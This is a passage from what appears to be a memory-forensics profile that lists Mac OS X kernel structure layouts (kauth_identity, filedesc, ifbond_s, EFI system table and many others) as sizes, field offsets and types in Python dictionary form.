    '_descriptorLengths': [0x80, ['pointer', ['unsigned long long']]],
    '_descriptorPrepared': [0x88, ['int']],
}],
  'proc_vnodepathinfo': [ 0x930, {
    'pvi_cdir': [0x0, ['vnode_info_path']],
    'pvi_rdir': [0x498, ['vnode_info_path']],
}],
  'kauth_identity': [ 0xd8, {
    'ki_link': [0x0, ['__unnamed_11029984']],
    'ki_valid': [0x10, ['int']],
    'ki_uid': [0x14, ['unsigned int']],
    'ki_gid': [0x18, ['unsigned int']],
    'ki_supgrpcnt': [0x1c, ['int']],
    'ki_supgrps': [0x20, ['array', 16, ['unsigned int']]],
    'ki_guid': [0x60, ['__unnamed_11029183']],
    'ki_ntsid': [0x70, ['__unnamed_11029238']],
    'ki_name': [0xb8, ['pointer', ['char']]],
    'ki_groups_expiry': [0xc0, ['long']],
    'ki_guid_expiry': [0xc8, ['long']],
    'ki_ntsid_expiry': [0xd0, ['long']],
}],
  'IODMACommand_class': [ 0x78, {
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'fRefCon': [0x20, ['pointer', ['void']]],
    'fMaxSegmentSize': [0x28, ['unsigned long long']],
    'fMaxTransferSize': [0x30, ['unsigned long long']],
    'fBypassMask': [0x38, ['unsigned long long']],
    'fMapper': [0x40, ['pointer', ['IOMapper_class']]],
    'fMemory': [0x48, ['pointer', ['IOMemoryDescriptor_class']]],
    'fOutSeg': [0x50, ['pointer', ['void']]],
    'fAlignMask': [0x58, ['unsigned int']],
    'fNumAddressBits': [0x5c, ['unsigned int']],
    'fNumSegments': [0x60, ['unsigned int']],
    'fMappingOptions': [0x64, ['Enumeration', {'target': 'int', 'choices': {0: 'kMapped', 1: 'kBypassed', 2: 'kNonCoherent', 32: 'kOnChip', 64: 'kIterateOnly', 15: 'kTypeMask', 16: 'kNoCacheStore'}}]],
    'fActive': [0x68, ['unsigned int']],
    'reserved': [0x70, ['pointer', ['IODMACommandInternal']]],
}],
  'nodereserve': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['nreserve']]],
}],
  'kauth_resolver_submitted_head': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['kauth_resolver_work']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['kauth_resolver_work']]]],
}],
  '__unnamed_5420163': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfsreq']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfsreq']]]],
}],
  'user64_sigevent': [ 0x20, {
    'sigev_notify': [0x0, ['int']],
    'sigev_signo': [0x4, ['int']],
    'sigev_value': [0x8, ['user64_sigval']],
    'sigev_notify_function': [0x10, ['unsigned long long']],
    'sigev_notify_attributes': [0x18, ['unsigned long long']],
}],
  'AppleTEXTHash': [ 0x10, {
    'ath_version': [0x0, ['int']],
    'ath_length': [0x4, ['int']],
    'ath_hash': [0x8, ['pointer', ['void']]],
}],
  'ipc_kmsg_queue': [ 0x8, {
    'ikmq_base': [0x0, ['pointer', ['ipc_kmsg']]],
}],
  'EFI_SYSTEM_TABLE_64': [ 0x78, {
    'Hdr': [0x0, ['__unnamed_4132323']],
    'FirmwareVendor': [0x18, ['unsigned long long']],
    'FirmwareRevision': [0x20, ['unsigned int']],
    '__pad': [0x24, ['unsigned int']],
    'ConsoleInHandle': [0x28, ['unsigned long long']],
    'ConIn': [0x30, ['unsigned long long']],
    'ConsoleOutHandle': [0x38, ['unsigned long long']],
    'ConOut': [0x40, ['unsigned long long']],
    'StandardErrorHandle': [0x48, ['unsigned long long']],
    'StdErr': [0x50, ['unsigned long long']],
    'RuntimeServices': [0x58, ['unsigned long long']],
    'BootServices': [0x60, ['unsigned long long']],
    'NumberOfTableEntries': [0x68, ['unsigned long long']],
    'ConfigurationTable': [0x70, ['unsigned long long']],
}],
  'vnop_mmap_args': [ 0x20, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_vp': [0x8, ['pointer', ['vnode']]],
    'a_fflags': [0x10, ['int']],
    'a_context': [0x18, ['pointer', ['vfs_context']]],
}],
  'dtrace_attribute': [ 0x3, {
    'dtat_name': [0x0, ['unsigned char']],
    'dtat_data': [0x1, ['unsigned char']],
    'dtat_class': [0x2, ['unsigned char']],
}],
  'plimit': [ 0x98, {
    'pl_rlimit': [0x0, ['array', 9, ['rlimit']]],
    'pl_refcnt': [0x90, ['int']],
}],
  'nfs_open_owner': [ 0x50, {
    'noo_link': [0x0, ['__unnamed_5426262']],
    'noo_lock': [0x10, ['__unnamed_5388464']],
    'noo_mount': [0x20, ['pointer', ['nfsmount']]],
    'noo_refcnt': [0x28, ['unsigned int']],
    'noo_flags': [0x2c, ['unsigned int']],
    'noo_cred': [0x30, ['pointer', ['ucred']]],
    'noo_name': [0x38, ['unsigned int']],
    'noo_seqid': [0x3c, ['unsigned int']],
    'noo_opens': [0x40, ['__unnamed_5426428']],
}],
  'key_cb': [ 0x8, {
    'key_count': [0x0, ['int']],
    'any_count': [0x4, ['int']],
}],
  'red_stats': [ 0x14, {
    'q_avg': [0x0, ['int']],
    '_pad': [0x4, ['unsigned int']],
    'drop_forced': [0x8, ['unsigned int']],
    'drop_unforced': [0xc, ['unsigned int']],
    'marked_packets': [0x10, ['unsigned int']],
}],
  'xunpcb64_list_entry': [ 0x10, {
    'le_next': [0x0, ['unsigned long long']],
    'le_prev': [0x8, ['unsigned long long']],
}],
  'dtrace_helper_provider': [ 0x58, {
    'dthp_generation': [0x0, ['int']],
    'dthp_ref': [0x4, ['unsigned int']],
    'dthp_prov': [0x8, ['dof_helper']],
}],
  'filedesc': [ 0x58, {
    'fd_ofiles': [0x0, ['pointer', ['pointer', ['fileproc']]]],
    'fd_ofileflags': [0x8, ['pointer', ['char']]],
    'fd_cdir': [0x10, ['pointer', ['vnode']]],
    'fd_rdir': [0x18, ['pointer', ['vnode']]],
    'fd_nfiles': [0x20, ['int']],
    'fd_lastfile': [0x24, ['int']],
    'fd_freefile': [0x28, ['int']],
    'fd_cmask': [0x2c, ['unsigned short']],
    'fd_knlistsize': [0x30, ['int']],
    'fd_knlist': [0x38, ['pointer', ['klist']]],
    'fd_knhashmask': [0x40, ['unsigned long']],
    'fd_knhash': [0x48, ['pointer', ['klist']]],
    'fd_flags': [0x50, ['int']],
}],
  'wrap_thread_call': [ 0x38, {
    'TChdl': [0x0, ['pointer', ['thread_call']]],
    'hdlr': [0x8, ['cyc_handler']],
    'when': [0x20, ['cyc_time']],
    'deadline': [0x30, ['unsigned long long']],
}],
  'utun_crypto_ctx': [ 0x38, {
    'valid': [0x0, ['int']],
    'type': [0x4, ['Enumeration', {'target': 'int', 'choices': {1: 'UTUN_CRYPTO_TYPE_IPSEC', 2: 'UTUN_CRYPTO_TYPE_DTLS', 3: 'UTUN_CRYPTO_TYPE_MAX'}}]],
    'unused': [0x8, ['unsigned short']],
    'keys_listhead': [0xa, ['chain']],
    'framer_listheads': [0x12, ['array', 2, ['framer_chain']]],
    'num_framers': [0x22, ['int']],
    'kpi_handle': [0x26, ['int']],
    'kpi_ref': [0x2a, ['pointer', ['char']]],
    'kpi_refcnt': [0x32, ['int']],
}],
  'so_procinfo': [ 0x8, {
    'spi_pid': [0x0, ['int']],
    'spi_epid': [0x4, ['int']],
}],
  'lstat64_extended_args': [ 0x20, {
    'path': [0x0, ['unsigned long long']],
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path_r_': [0x8, ['array', 0, ['char']]],
    'ub_l_': [0x8, ['array', 0, ['char']]],
    'ub': [0x8, ['unsigned long long']],
    'xsecurity': [0x10, ['unsigned long long']],
    'ub_r_': [0x10, ['array', 0, ['char']]],
    'xsecurity_l_': [0x10, ['array', 0, ['char']]],
    'xsecurity_r_': [0x18, ['array', 0, ['char']]],
    'xsecurity_size': [0x18, ['unsigned long long']],
    'xsecurity_size_l_': [0x18, ['array', 0, ['char']]],
    'xsecurity_size_r_': [0x20, ['array', 0, ['char']]],
}],
  'vnode_fdinfowithpath': [ 0x4b0, {
    'pfi': [0x0, ['proc_fileinfo']],
    'pvip': [0x18, ['vnode_info_path']],
}],
  'pwrite_nocancel_args': [ 0x20, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'buf_l_': [0x8, ['array', 0, ['char']]],
    'buf': [0x8, ['unsigned long long']],
    'nbyte_l_': [0x10, ['array', 0, ['char']]],
    'buf_r_': [0x10, ['array', 0, ['char']]],
    'nbyte': [0x10, ['unsigned long long']],
    'offset_l_': [0x18, ['array', 0, ['char']]],
    'offset': [0x18, ['long long']],
    'nbyte_r_': [0x18, ['array', 0, ['char']]],
    'offset_r_': [0x20, ['array', 0, ['char']]],
}],
  'commpage_time_data': [ 0x30, {
    'nt_tsc_base': [0x0, ['unsigned long long']],
    'nt_scale': [0x8, ['unsigned int']],
    'nt_shift': [0xc, ['unsigned int']],
    'nt_ns_base': [0x10, ['unsigned long long']],
    'nt_generation': [0x18, ['unsigned int']],
    'gtod_generation': [0x1c, ['unsigned int']],
    'gtod_ns_base': [0x20, ['unsigned long long']],
    'gtod_sec_base': [0x28, ['unsigned long long']],
}],
  'vnop_getxattr_args': [ 0x38, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_vp': [0x8, ['pointer', ['vnode']]],
    'a_name': [0x10, ['pointer', ['char']]],
    'a_uio': [0x18, ['pointer', ['uio']]],
    'a_size': [0x20, ['pointer', ['unsigned long']]],
    'a_options': [0x28, ['int']],
    'a_context': [0x30, ['pointer', ['vfs_context']]],
}],
  'user64_eproc': [ 0x160, {
    'e_paddr': [0x0, ['unsigned long long']],
    'e_sess': [0x8, ['unsigned long long']],
    'e_pcred': [0x10, ['user64_pcred']],
    'e_ucred': [0x78, ['_ucred']],
    'e_vm': [0xc8, ['user_vmspace']],
    'e_ppid': [0x108, ['int']],
    'e_pgid': [0x10c, ['int']],
    'e_jobc': [0x110, ['short']],
    'e_tdev': [0x114, ['int']],
    'e_tpgid': [0x118, ['int']],
    'e_tsess': [0x120, ['unsigned long long']],
    'e_wmesg': [0x128, ['array', 8, ['char']]],
    'e_xsize': [0x130, ['int']],
    'e_xrssize': [0x134, ['short']],
    'e_xccount': [0x136, ['short']],
    'e_xswrss': [0x138, ['short']],
    'e_flag': [0x13c, ['int']],
    'e_login': [0x140, ['array', 12, ['char']]],
    'e_lcid': [0x14c, ['int']],
    'e_spare': [0x150, ['array', 3, ['int']]],
}],
  'ipc_pset': [ 0x58, {
    'ips_object': [0x0, ['ipc_object']],
    'ips_messages': [0x10, ['ipc_mqueue']],
}],
  'mkfifo_extended_args': [ 0x28, {
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path': [0x0, ['unsigned long long']],
    'uid': [0x8, ['unsigned int']],
    'path_r_': [0x8, ['array', 0, ['char']]],
    'uid_l_': [0x8, ['array', 0, ['char']]],
    'uid_r_': [0xc, ['array', 4, ['char']]],
    'gid': [0x10, ['unsigned int']],
    'gid_l_': [0x10, ['array', 0, ['char']]],
    'gid_r_': [0x14, ['array', 4, ['char']]],
    'mode_l_': [0x18, ['array', 0, ['char']]],
    'mode': [0x18, ['int']],
    'mode_r_': [0x1c, ['array', 4, ['char']]],
    'xsecurity': [0x20, ['unsigned long long']],
    'xsecurity_l_': [0x20, ['array', 0, ['char']]],
    'xsecurity_r_': [0x28, ['array', 0, ['char']]],
}],
  'clock_frequency_info_t': [ 0xc8, {
    'bus_clock_rate_hz': [0x0, ['unsigned long']],
    'cpu_clock_rate_hz': [0x8, ['unsigned long']],
    'dec_clock_rate_hz': [0x10, ['unsigned long']],
    'bus_clock_rate_num': [0x18, ['unsigned long']],
    'bus_clock_rate_den': [0x20, ['unsigned long']],
    'bus_to_cpu_rate_num': [0x28, ['unsigned long']],
    'bus_to_cpu_rate_den': [0x30, ['unsigned long']],
    'bus_to_dec_rate_num': [0x38, ['unsigned long']],
    'bus_to_dec_rate_den': [0x40, ['unsigned long']],
    'timebase_frequency_hz': [0x48, ['unsigned long']],
    'timebase_frequency_num': [0x50, ['unsigned long']],
    'timebase_frequency_den': [0x58, ['unsigned long']],
    'bus_frequency_hz': [0x60, ['unsigned long long']],
    'bus_frequency_min_hz': [0x68, ['unsigned long long']],
    'bus_frequency_max_hz': [0x70, ['unsigned long long']],
    'cpu_frequency_hz': [0x78, ['unsigned long long']],
    'cpu_frequency_min_hz': [0x80, ['unsigned long long']],
    'cpu_frequency_max_hz': [0x88, ['unsigned long long']],
    'prf_frequency_hz': [0x90, ['unsigned long long']],
    'prf_frequency_min_hz': [0x98, ['unsigned long long']],
    'prf_frequency_max_hz': [0xa0, ['unsigned long long']],
    'mem_frequency_hz': [0xa8, ['unsigned long long']],
    'mem_frequency_min_hz': [0xb0, ['unsigned long long']],
    'mem_frequency_max_hz': [0xb8, ['unsigned long long']],
    'fix_frequency_hz': [0xc0, ['unsigned long long']],
}],
  'ip6_ext': [ 0x2, {
    'ip6e_nxt': [0x0, ['unsigned char']],
    'ip6e_len': [0x1, ['unsigned char']],
}],
  'mtrr_var_range': [ 0x18, {
    'base': [0x0, ['unsigned long long']],
    'mask': [0x8, ['unsigned long long']],
    'refcnt': [0x10, ['unsigned int']],
}],
  'bridge_iflist': [ 0x1d0, {
    'bif_next': [0x0, ['__unnamed_6520115']],
    'bif_ifp': [0x10, ['pointer', ['ifnet']]],
    'bif_stp': [0x18, ['bstp_port']],
    'bif_ifflags': [0x1a0, ['unsigned int']],
    'bif_savedcaps': [0x1a4, ['int']],
    'bif_addrmax': [0x1a8, ['unsigned int']],
    'bif_addrcnt': [0x1ac, ['unsigned int']],
    'bif_addrexceeded': [0x1b0, ['unsigned int']],
    'bif_iff_ref': [0x1b8, ['pointer', ['ifnet_filter']]],
    'bif_sc': [0x1c0, ['pointer', ['bridge_softc']]],
    'bif_flags': [0x1c8, ['unsigned int']],
}],
  'user64_stat64': [ 0x90, {
    'st_dev': [0x0, ['int']],
    'st_mode': [0x4, ['unsigned short']],
    'st_nlink': [0x6, ['unsigned short']],
    'st_ino': [0x8, ['unsigned long long']],
    'st_uid': [0x10, ['unsigned int']],
    'st_gid': [0x14, ['unsigned int']],
    'st_rdev': [0x18, ['int']],
    'st_atimespec': [0x20, ['user64_timespec']],
    'st_mtimespec': [0x30, ['user64_timespec']],
    'st_ctimespec': [0x40, ['user64_timespec']],
    'st_birthtimespec': [0x50, ['user64_timespec']],
    'st_size': [0x60, ['long long']],
    'st_blocks': [0x68, ['long long']],
    'st_blksize': [0x70, ['int']],
    'st_flags': [0x74, ['unsigned int']],
    'st_gen': [0x78, ['unsigned int']],
    'st_lspare': [0x7c, ['unsigned int']],
    'st_qspare': [0x80, ['array', 2, ['long long']]],
}],
  'pfioc_natlook': [ 0x54, {
    'saddr': [0x0, ['pf_addr']],
    'daddr': [0x10, ['pf_addr']],
    'rsaddr': [0x20, ['pf_addr']],
    'rdaddr': [0x30, ['pf_addr']],
    'sxport': [0x40, ['pf_state_xport']],
    'dxport': [0x44, ['pf_state_xport']],
    'rsxport': [0x48, ['pf_state_xport']],
    'rdxport': [0x4c, ['pf_state_xport']],
    'af': [0x50, ['unsigned char']],
    'proto': [0x51, ['unsigned char']],
    'proto_variant': [0x52, ['unsigned char']],
    'direction': [0x53, ['unsigned char']],
}],
  '__unnamed_6809399': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['bondport_s']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['bondport_s']]]],
}],
  'ifnet_init_params': [ 0x90, {
    'uniqueid': [0x0, ['pointer', ['void']]],
    'uniqueid_len': [0x8, ['unsigned int']],
    'name': [0x10, ['pointer', ['char']]],
    'unit': [0x18, ['unsigned int']],
    'family': [0x1c, ['unsigned int']],
    'type': [0x20, ['unsigned int']],
    'output': [0x28, ['pointer', ['void']]],
    'demux': [0x30, ['pointer', ['void']]],
    'add_proto': [0x38, ['pointer', ['void']]],
    'del_proto': [0x40, ['pointer', ['void']]],
    'check_multi': [0x48, ['pointer', ['void']]],
    'framer': [0x50, ['pointer', ['void']]],
    'softc': [0x58, ['pointer', ['void']]],
    'ioctl': [0x60, ['pointer', ['void']]],
    'set_bpf_tap': [0x68, ['pointer', ['void']]],
    'detach': [0x70, ['pointer', ['void']]],
    'event': [0x78, ['pointer', ['void']]],
    'broadcast_addr': [0x80, ['pointer', ['void']]],
    'broadcast_len': [0x88, ['unsigned int']],
}],
  'pfioc_table_64': [ 0x450, {
    'pfrio_table': [0x0, ['pfr_table']],
    'pfrio_buffer': [0x428, ['unsigned long long']],
    'pfrio_esize': [0x430, ['int']],
    'pfrio_size': [0x434, ['int']],
    'pfrio_size2': [0x438, ['int']],
    'pfrio_nadd': [0x43c, ['int']],
    'pfrio_ndel': [0x440, ['int']],
    'pfrio_nchange': [0x444, ['int']],
    'pfrio_flags': [0x448, ['int']],
    'pfrio_ticket': [0x44c, ['unsigned int']],
}],
  'machine_info': [ 0x28, {
    'major_version': [0x0, ['int']],
    'minor_version': [0x4, ['int']],
    'max_cpus': [0x8, ['int']],
    'memory_size': [0xc, ['unsigned int']],
    'max_mem': [0x10, ['unsigned long long']],
    'physical_cpu': [0x18, ['unsigned int']],
    'physical_cpu_max': [0x1c, ['int']],
    'logical_cpu': [0x20, ['unsigned int']],
    'logical_cpu_max': [0x24, ['int']],
}],
  'getsockname_args': [ 0x18, {
    'fdes': [0x0, ['int']],
    'fdes_l_': [0x0, ['array', 0, ['char']]],
    'fdes_r_': [0x4, ['array', 4, ['char']]],
    'asa_l_': [0x8, ['array', 0, ['char']]],
    'asa': [0x8, ['unsigned long long']],
    'alen_l_': [0x10, ['array', 0, ['char']]],
    'alen': [0x10, ['unsigned long long']],
    'asa_r_': [0x10, ['array', 0, ['char']]],
    'alen_r_': [0x18, ['array', 0, ['char']]],
}],
  'MkextEntryRef': [ 0x10, {
    'mkext': [0x0, ['pointer', ['mkext_basic_header']]],
    'fileinfo': [0x8, ['pointer', ['void']]],
}],
  'ipsecrequest': [ 0x120, {
    'next': [0x0, ['pointer', ['ipsecrequest']]],
    'saidx': [0x8, ['secasindex']],
    'level': [0x110, ['unsigned int']],
    'sp': [0x118, ['pointer', ['secpolicy']]],
}],
  'nfs_user_stat_hashtbl_head': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['nfs_user_stat_node']]],
}],
  'esptail': [ 0x2, {
    'esp_padlen': [0x0, ['unsigned char']],
    'esp_nxt': [0x1, ['unsigned char']],
}],
  'lstat_args': [ 0x10, {
    'path': [0x0, ['unsigned long long']],
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path_r_': [0x8, ['array', 0, ['char']]],
    'ub_l_': [0x8, ['array', 0, ['char']]],
    'ub': [0x8, ['unsigned long long']],
    'ub_r_': [0x10, ['array', 0, ['char']]],
}],
  'ifbond_s': [ 0xa0, {
    'ifb_bond_list': [0x0, ['__unnamed_6809995']],
    'ifb_flags': [0x10, ['int']],
    'ifb_retain_count': [0x14, ['int']],
    'ifb_name': [0x18, ['array', 16, ['char']]],
    'ifb_ifp': [0x28, ['pointer', ['ifnet']]],
    'ifb_bpf_input': [0x30, ['pointer', ['void']]],
    'ifb_bpf_output': [0x38, ['pointer', ['void']]],
    'ifb_altmtu': [0x40, ['int']],
    'ifb_port_list': [0x48, ['port_list']],
    'ifb_port_count': [0x58, ['short']],
    'ifb_lag_list': [0x60, ['lag_list']],
    'ifb_key': [0x70, ['unsigned short']],
    'ifb_max_active': [0x72, ['short']],
    'ifb_active_lag': [0x78, ['pointer', ['LAG_s']]],
    'ifb_ifma_slow_proto': [0x80, ['pointer', ['ifmultiaddr']]],
    'ifb_distributing_array': [0x88, ['pointer', ['pointer', ['bondport_s']]]],
    'ifb_distributing_count': [0x90, ['int']],
    'ifb_last_link_event': [0x94, ['int']],
    'ifb_mode': [0x98, ['int']],
}],
  'ipt_timestamp': [ 0x8, {
    'ipt_ta': [0x0, ['array', 1, ['ipt_ta']]],
    'ipt_time': [0x0, ['array', 1, ['unsigned int']]],
}],
  'linkorigin': [ 0x20, {
    'lo_link': [0x0, ['__unnamed_10548099']],
    'lo_thread': [0x10, ['pointer', ['void']]],
    'lo_cnid': [0x18, ['unsigned int']],
    'lo_parentcnid': [0x1c, ['unsigned int']],
}],
  'time_trigger': [ 0x70, {
    'tcall': [0x0, ['timer_call']],
    'period': [0x60, ['unsigned long long']],
    'actionid': [0x68, ['unsigned int']],
    'active': [0x6c, ['unsigned int']],
}],
  'sackhole_head': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['sackhole']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['sackhole']]]],
}],
  '__unnamed_7601999': [ 0x8, {
    'pfrw1_addr': [0x0, ['unsigned long long']],
    'pfrw1_dyn': [0x0, ['pointer', ['pfi_dynaddr']]],
    'pfrw1_astats': [0x0, ['unsigned long long']],
    'pfrw1_workq': [0x0, ['pointer', ['pfr_kentryworkq']]],
    'pfrw1_kentry': [0x0, ['pointer', ['pfr_kentry']]],
}],
  'igmp_tparams': [ 0x10, {
    'qpt': [0x0, ['int']],
    'it': [0x4, ['int']],
    'cst': [0x8, ['int']],
    'sct': [0xc, ['int']],
}],
  'xcpmio_forced_idle': [ 0x8, {
    'forced_idle_ratio': [0x0, ['unsigned int']],
    'forced_idle_period': [0x4, ['unsigned int']],
}],
  '__unnamed_5419435': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfs_gss_clnt_ctx']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfs_gss_clnt_ctx']]]],
}],
  'vm_region_submap_info_64': [ 0x44, {
    'protection': [0x0, ['int']],
    'max_protection': [0x4, ['int']],
    'inheritance': [0x8, ['unsigned int']],
    'offset': [0xc, ['unsigned long long']],
    'user_tag': [0x14, ['unsigned int']],
    'pages_resident': [0x18, ['unsigned int']],
    'pages_shared_now_private': [0x1c, ['unsigned int']],
    'pages_swapped_out': [0x20, ['unsigned int']],
    'pages_dirtied': [0x24, ['unsigned int']],
    'ref_count': [0x28, ['unsigned int']],
    'shadow_depth': [0x2c, ['unsigned short']],
    'external_pager': [0x2e, ['unsigned char']],
    'share_mode': [0x2f, ['unsigned char']],
    'is_submap': [0x30, ['int']],
    'behavior': [0x34, ['int']],
    'object_id': [0x38, ['unsigned int']],
    'user_wired_count': [0x3c, ['unsigned short']],
    'pages_reusable': [0x40, ['unsigned int']],
}],
  'ifqueue': [ 0x20, {
    'ifq_head': [0x0, ['pointer', ['void']]],
    'ifq_tail': [0x8, ['pointer', ['void']]],
    'ifq_len': [0x10, ['int']],
    'ifq_maxlen': [0x14, ['int']],
    'ifq_drops': [0x18, ['int']],
}],
  '__unnamed_7154869': [ 0x8, {
    'sle_next': [0x0, ['pointer', ['net_str_id_entry']]],
}],
  'extent': [ 0x18, {
    'e_base': [0x0, ['unsigned long long']],
    'e_min': [0x8, ['unsigned long long']],
    'e_max': [0x10, ['unsigned long long']],
}],
  '__unnamed_16759954': [ 0x10, {
    'le_next': [0x0, ['pointer', ['fdescnode']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['fdescnode']]]],
}],
  'mach_port_qos': [ 0x8, {
    'pad1': [0x0, ['BitField', {'end_bit': 32, 'start_bit': 2}]],
    'name': [0x0, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'prealloc': [0x0, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
    'len': [0x4, ['unsigned int']],
}],
  'ifaddrhead': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['ifaddr']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['ifaddr']]]],
}],
  'ip_mreq': [ 0x8, {
    'imr_multiaddr': [0x0, ['in_addr']],
    'imr_interface': [0x4, ['in_addr']],
}],
  'munlockall_args': [ 0x8, {
    'how': [0x0, ['int']],
    'how_l_': [0x0, ['array', 0, ['char']]],
    'how_r_': [0x4, ['array', 4, ['char']]],
}],
  '__unnamed_7799333': [ 0x38, {
    'xmit_cnt': [0x0, ['pktcntr']],
    'drop_cnt': [0x10, ['pktcntr']],
    'drop_forced': [0x20, ['unsigned long long']],
    'drop_unforced': [0x28, ['unsigned long long']],
    'marked_packets': [0x30, ['unsigned long long']],
}],
  'user64_rusage': [ 0x90, {
    'ru_utime': [0x0, ['user64_timeval']],
    'ru_stime': [0x10, ['user64_timeval']],
    'ru_maxrss': [0x20, ['long long']],
    'ru_ixrss': [0x28, ['long long']],
    'ru_idrss': [0x30, ['long long']],
    'ru_isrss': [0x38, ['long long']],
    'ru_minflt': [0x40, ['long long']],
    'ru_majflt': [0x48, ['long long']],
    'ru_nswap': [0x50, ['long long']],
    'ru_inblock': [0x58, ['long long']],
    'ru_oublock': [0x60, ['long long']],
    'ru_msgsnd': [0x68, ['long long']],
    'ru_msgrcv': [0x70, ['long long']],
    'ru_nsignals': [0x78, ['long long']],
    'ru_nvcsw': [0x80, ['long long']],
    'ru_nivcsw': [0x88, ['long long']],
}],
  'ifreq': [ 0x20, {
    'ifr_name': [0x0, ['array', 16, ['char']]],
    'ifr_ifru': [0x10, ['__unnamed_7902688']],
}],
  '__unnamed_7903035': [ 0x10, {
    'ifl_level': [0x0, ['int']],
    'ifl_flags': [0x4, ['unsigned int']],
    'ifl_category': [0x8, ['int']],
    'ifl_subcategory': [0xc, ['int']],
}],
  'processor_set_load_info': [ 0x10, {
    'task_count': [0x0, ['int']],
    'thread_count': [0x4, ['int']],
    'load_average': [0x8, ['int']],
    'mach_factor': [0xc, ['int']],
}],
  '__unnamed_10503723': [ 0x4, {
    'v': [0x0, ['short']],
    'h': [0x2, ['short']],
}],
  'host_sched_info': [ 0x8, {
    'min_timeout': [0x0, ['int']],
    'min_quantum': [0x4, ['int']],
}],
  '__unnamed_9496870': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['in6_multi_dbg']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['in6_multi_dbg']]]],
}],
  '__unnamed_9586530': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['socket_filter']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['socket_filter']]]],
}],
  '__unnamed_10461891': [ 0x10, {
    'le_next': [0x0, ['pointer', ['nreserve']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['nreserve']]]],
}],
  '__unnamed_5670865': [ 0x30, {
    'IV': [0x0, ['array', 20, ['unsigned char']]],
    'out': [0x14, ['array', 20, ['unsigned char']]],
    'index': [0x28, ['unsigned int']],
    'numout': [0x2c, ['unsigned int']],
}],
  '__BlobIndex': [ 0x8, {
    'type': [0x0, ['unsigned int']],
    'offset': [0x4, ['unsigned int']],
}],
  'in_ifaddrhead': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['in_ifaddr']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['in_ifaddr']]]],
}],
  'kern_sigaltstack': [ 0x18, {
    'ss_sp': [0x0, ['unsigned long long']],
    'ss_size': [0x8, ['unsigned long long']],
    'ss_flags': [0x10, ['int']],
}],
  'arpstat': [ 0x3c, {
    'txrequests': [0x0, ['unsigned int']],
    'txreplies': [0x4, ['unsigned int']],
    'txannounces': [0x8, ['unsigned int']],
    'rxrequests': [0xc, ['unsigned int']],
    'rxreplies': [0x10, ['unsigned int']],
    'received': [0x14, ['unsigned int']],
    'txconflicts': [0x18, ['unsigned int']],
    'invalidreqs': [0x1c, ['unsigned int']],
    'reqnobufs': [0x20, ['unsigned int']],
    'dropped': [0x24, ['unsigned int']],
    'purged': [0x28, ['unsigned int']],
    'timeouts': [0x2c, ['unsigned int']],
    'dupips': [0x30, ['unsigned int']],
    'inuse': [0x34, ['unsigned int']],
    'txurequests': [0x38, ['unsigned int']],
}],
  'rsrcfork_header': [ 0x11e, {
    'fh_DataOffset': [0x0, ['unsigned int']],
    'fh_MapOffset': [0x4, ['unsigned int']],
    'fh_DataLength': [0x8, ['unsigned int']],
    'fh_MapLength': [0xc, ['unsigned int']],
    'systemData': [0x10, ['array', 112, ['unsigned char']]],
    'appData': [0x80, ['array', 128, ['unsigned char']]],
    'mh_DataOffset': [0x100, ['unsigned int']],
    'mh_MapOffset': [0x104, ['unsigned int']],
    'mh_DataLength': [0x108, ['unsigned int']],
    'mh_MapLength': [0x10c, ['unsigned int']],
    'mh_Next': [0x110, ['unsigned int']],
    'mh_RefNum': [0x114, ['unsigned short']],
    'mh_Attr': [0x116, ['unsigned char']],
    'mh_InMemoryAttr': [0x117, ['unsigned char']],
    'mh_Types': [0x118, ['unsigned short']],
    'mh_Names': [0x11a, ['unsigned short']],
    'typeCount': [0x11c, ['unsigned short']],
}],
  '__unnamed_5343148': [ 0x10, {
    'le_next': [0x0, ['pointer', ['nfs_user_stat_node']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['nfs_user_stat_node']]]],
}],
  'utun_crypto_dtls_args_v1': [ 0x4, {
    'kpi_handle': [0x0, ['int']],
}],
  'ip6_fw': [ 0xd0, {
    'version': [0x0, ['unsigned int']],
    'context': [0x8, ['pointer', ['void']]],
    'fw_pcnt': [0x10, ['unsigned int']],
    'fw_bcnt': [0x14, ['unsigned int']],
    'fw_src': [0x18, ['in6_addr']],
    'fw_dst': [0x28, ['in6_addr']],
    'fw_smsk': [0x38, ['in6_addr']],
    'fw_dmsk': [0x48, ['in6_addr']],
    'fw_number': [0x58, ['unsigned short']],
    'fw_flg': [0x5a, ['unsigned short']],
    'fw_ipflg': [0x5c, ['unsigned int']],
    'fw_pts': [0x60, ['array', 10, ['unsigned short']]],
    'fw_ip6opt': [0x74, ['unsigned char']],
    'fw_ip6nopt': [0x75, ['unsigned char']],
